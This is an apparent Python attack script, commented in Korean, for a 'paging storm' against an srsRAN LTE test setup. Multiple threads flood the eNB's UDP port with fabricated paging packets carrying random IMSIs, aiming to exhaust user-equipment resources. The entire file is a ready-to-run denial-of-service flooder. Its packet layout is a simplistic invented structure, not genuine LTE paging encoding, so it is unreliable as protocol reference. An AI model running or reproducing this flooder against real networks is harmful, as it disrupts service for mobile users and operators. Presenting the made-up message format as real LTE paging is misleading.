#!/usr/bin/env python3
"""
LTE Paging Storm Attack
srsRAN 환경에서 대량의 Paging 메시지를 전송하여 UE의 리소스를 고갈시키는 공격
"""

import socket
import struct
import time
import threading
import random
import sys

class PagingStormAttack:
    def __init__(self, num_pages=10000):
        # 환경변수에서 설정 읽기
        import os
        self.target_ip = os.getenv('ENB_IP')
        self.target_port = int(os.getenv('ENB_RX_PORT'))
        self.num_pages = num_pages
        self.attack_threads = []
        self.running = False
        
    def generate_imsi(self):
        """임의의 IMSI 생성"""
        return random.randint(100000000000000, 999999999999999)  # IMSI는 15자리
    
    def create_paging_message(self, imsi):
        """Paging 메시지 생성"""
        # 간단한 Paging 메시지 구조
        paging_msg = struct.pack('>I', 0x12345678)  # Message Header
        paging_msg += struct.pack('>H', 0x0002)     # Message Type (Paging)
        paging_msg += struct.pack('>Q', imsi)       # IMSI
        paging_msg += struct.pack('>H', 0x0001)     # Paging Cause
        return paging_msg
    
    def send_paging_burst(self, burst_size=100, interval=0.1):
        """Paging 메시지 버스트 전송"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        burst_count = 0
        total_packets = 0
        
        print(f"[{time.strftime('%H:%M:%S')}] Paging 버스트 스레드 시작 (버스트 크기: {burst_size})")
        
        while self.running:
            try:
                # 버스트 전송
                for _ in range(burst_size):
                    imsi = self.generate_imsi()
                    paging_packet = self.create_paging_message(imsi)
                    sock.sendto(paging_packet, (self.target_ip, self.target_port))
                    total_packets += 1
                
                burst_count += 1
                
                # 10번 버스트마다 로그 출력
                if burst_count % 10 == 0:
                    print(f"[{time.strftime('%H:%M:%S')}] Paging 버스트 {burst_count}회 완료 - 총 {total_packets}개 패킷 전송")
                
                # 간격 대기
                time.sleep(interval)
                
            except Exception as e:
                print(f"[{time.strftime('%H:%M:%S')}] Paging 전송 오류: {e}")
                break
        
        print(f"[{time.strftime('%H:%M:%S')}] Paging 버스트 스레드 종료 - 총 {total_packets}개 패킷 전송")
        sock.close()
    
    def start_attack(self, duration=60, num_threads=10):
        """공격 시작"""
        print(f"\n{'='*60}")
        print(f"🌪️  Paging Storm 공격 시작")
        print(f"{'='*60}")
        print(f"📡 대상: {self.target_ip}:{self.target_port}")
        print(f"🧵 스레드 수: {num_threads}")
        print(f"⏱️  지속 시간: {duration}초")
        print(f"🕐 시작 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*60}")
        
        self.running = True
        
        # 여러 스레드로 동시 공격
        print(f"🔄 Paging 스레드 생성 중...")
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.send_paging_burst,
                args=(100, 0.05)  # 100개씩 0.05초 간격
            )
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            print(f"✅ Paging 스레드 {i+1}/{num_threads} 시작됨")
        
        print(f"🎯 {num_threads}개 Paging 스레드 모두 시작됨!")
        print(f"🔥 Paging Storm 진행 중... (Ctrl+C로 중단 가능)")
        print(f"{'='*60}")
        
        # 공격 지속 시간 대기
        time.sleep(duration)
        self.stop_attack()
    
    def stop_attack(self):
        """공격 중지"""
        print(f"\n{'='*60}")
        print(f"🛑 Paging Storm 공격 중지 중...")
        print(f"{'='*60}")
        self.running = False
        
        # 모든 스레드 종료 대기
        print(f"⏳ Paging 스레드 종료 대기 중...")
        for i, thread in enumerate(self.attack_threads):
            thread.join(timeout=1)
            if (i + 1) % 5 == 0:
                print(f"✅ {i + 1}/{len(self.attack_threads)} 스레드 종료 완료")
        
        print(f"🎉 Paging Storm 공격 완료!")
        print(f"🕐 종료 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*60}")

def main():
    # 공격 파라미터
    duration = 120
    num_threads = 20
    
    # 공격 실행 (환경변수에서 설정 자동 읽기)
    attack = PagingStormAttack()
    
    try:
        attack.start_attack(duration, num_threads)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attack.stop_attack()

if __name__ == "__main__":
    main()
